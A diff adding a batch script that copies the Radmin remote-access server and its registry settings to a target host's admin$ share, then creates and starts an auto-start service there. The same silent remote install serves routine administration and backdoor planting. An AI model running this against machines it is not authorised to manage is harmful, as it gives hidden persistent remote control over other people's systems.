@@ -1,0 +1,10 @@
+@echo off
+
+copy *.dll \\%1\admin$\system32		
+copy r_server.exe \\%1\admin$\system32
+
+reg copy HKLM\SYSTEM\RAdmin \\127.0.0.1 HKLM\SYSTEM\Radmin \\%1
+
+sc \\%1 create r_server binpath= "c:\winnt\system32\r_server.exe /service" type= own start= auto DISPLAYNAME= "Remote Administrator Service"
+
+sc \\%1 start r_server
